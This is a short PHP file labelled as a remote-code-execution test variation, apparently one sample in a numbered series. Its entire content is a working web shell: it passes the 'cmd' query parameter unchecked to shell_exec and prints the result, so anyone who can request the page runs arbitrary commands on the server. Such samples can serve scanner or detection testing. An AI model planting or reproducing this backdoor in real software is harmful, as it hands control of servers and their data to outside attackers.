<?php
// RCE test variation #1308
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>